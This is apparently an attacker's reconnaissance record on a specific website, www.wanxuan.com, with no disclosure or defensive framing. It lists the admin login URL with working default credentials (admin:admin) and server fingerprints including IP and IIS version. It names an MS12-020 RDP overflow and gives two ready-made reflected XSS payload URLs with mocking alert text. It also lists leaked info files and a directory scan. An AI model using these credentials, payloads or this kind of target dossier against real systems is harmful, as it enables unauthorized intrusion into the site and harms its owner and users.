testsite:www.wanxuan.com
后台：http://www.wanxuan.com/shopadmin/admin/shopxplogin.asp
username:admin  password:admin
你妹，是尼日还是俺日阿？
---------------------------------------------------------------------------------------------------
ASP_NET, ActiveX[Flash-ActiveX][D27CDB6E-AE6D-11cf-96B8-444553540000,d27cdb6e-ae6d-11cf-96b8-444553540000]
Adobe-Flash, Cookies[ASPSESSIONIDQATSADAQ], Country[CHINA][CN], Email[wx_a1@126.com]
 Frame, HTTPServer[Microsoft-IIS/6.0], IP[119.57.25.22], Microsoft-IIS[6.0]
Object["http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0
"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0]
["clsid:D27CDB6E-AE6D-11cf-96B8-444553540000,"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000], Script[JavaScript,javascript,text/javascript]
Title[%D6%D0%B9%FA%CD%F2%D0%FB%CD%F8 %D0%FB%B4%AB%CD%F8], X-Powered-By[ASP.NET]
------------------------------------------------------------------------------------------------------------------


BUG
1.RDP Remote Buffer Overflow (MS12-020)

2.WEAK PASSWORD  
http://www.wanxuan.com/shopadmin/admin/shopxplogin.asp   admin:admin

3.XSS
http://www.wanxuan.com/cyinfo/ip.asp?ip=%22%3E%3CH1%3E%3Cscript%3Ealert%28/%E5%B0%8F%E6%99%BA%E6%98%AF%E4%B8%AA%E5%9D%91%E8%B4%A7/%29%3C/script%3E%3C%2FH1%3E
http://www.wanxuan.com/cyinfo/phone.asp?phone=<script>alert(/SB/)</script>

4.IIS Short File/Folder Name Disclosure


-------------------------------------------------------------------------------------------------------------------
信息泄漏
 http://www.wanxuan.com/userlanding/readme.txt
http://www.wanxuan.com/bdunion.txt
http://www.wanxuan.com/info.txt

------------------------------------------------------------------------------------------------
扫描
http://www.wanxuan.com/Login.Asp        200
http://www.wanxuan.com/conn.asp        200
http://www.wanxuan.com/index.asp        200
http://www.wanxuan.com/index1.asp        200
http://www.wanxuan.com/top.asp        200
http://www.wanxuan.com/foot.asp        200
http://www.wanxuan.com/shopadmin        301
http://www.wanxuan.com/database/        403
http://www.wanxuan.com/aspnet_client/system_web/        403
http://www.wanxuan.com/shopadmin/        200
http://www.wanxuan.com/aspnet_client/system_web/2_0_50727        403
http://www.wanxuan.com/aspnet_client/        403
http://www.wanxuan.com/info.txt        200
http://www.wanxuan.com/file        301
http://www.wanxuan.com/news/        403
http://www.wanxuan.com/images/        403
http://www.wanxuan.com/database        301
http://www.wanxuan.com/images        301
http://www.wanxuan.com/xwzx        301
http://www.wanxuan.com/aspnet_client/system_web/2_0_50727/        403
http://www.wanxuan.com/support/        200
http://www.wanxuan.com/network/        200
http://www.wanxuan.com/file/        200
http://www.wanxuan.com/js.js        200
http://www.wanxuan.com/code        301
http://www.wanxuan.com/img/        403
http://www.wanxuan.com/Js        301
http://www.wanxuan.com/news        301
http://www.wanxuan.com/product        301
http://www.wanxuan.com/support        301
http://www.wanxuan.com/bdunion.txt        200
http://www.wanxuan.com/code/        403
http://www.wanxuan.com/Images        301
http://www.wanxuan.com/img        301
http://www.wanxuan.com/News        301
http://www.wanxuan.com/Product/        403
http://www.wanxuan.com/Skin/        403
http://www.wanxuan.com/xwzx/        200
http://www.wanxuan.com/Database        301
